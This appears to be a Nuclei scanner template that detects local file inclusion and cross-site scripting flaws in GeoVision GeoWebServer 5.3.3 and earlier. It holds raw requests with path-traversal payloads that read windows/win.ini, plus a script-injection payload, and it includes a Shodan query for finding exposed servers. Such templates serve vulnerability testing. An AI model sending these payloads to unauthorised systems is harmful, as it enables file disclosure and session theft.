http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "for 16-bit", "[fonts]", "[extensions]")
    - contains(content_type, "application/octet-stream")
    - status_code == 200
    name: lfi
    type: dsl
  - condition: and
    dsl:
    - contains_all(body, "<script>alert(document.domain)</script>={\"AeDebug")
    - contains(content_type, "text/html")
    - status_code == 200
    name: xss
    type: dsl
  matchers-condition: or
  raw:
  - 'GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>alert(document.domain)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /Visitor/bin/WebStrings.srf?obj_name=win.ini HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 0

    '
  - 'GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini
    HTTP/1.1

    Host: {{Hostname}}

    '
id: geovision-geowebserver-lfi-xss
info:
  author: shamo0
  description: 'GEOVISION GEOWEBSERVER <= 5.3.3 is vulnerable to several XSS, HTML
    Injection, and Local File Include (LFI) vectors. The application fails to properly
    sanitize user requests, allowing injection of HTML code and XSS, as well as client-side
    exploitation, including session theft.

    '
  metadata:
    max-request: 3
    shodan-query: title:"Geowebserver"
    verified: true
  name: GeoVision Geowebserver <= 5.3.3 - Local File Inclusion / Cross-Site Scripting
  reference:
  - https://www.geovision.com.tw/cyber_security.php
  - https://www.exploit-db.com/exploits/50211
  severity: high
  tags: geovision,geowebserver,lfi,xss,vuln
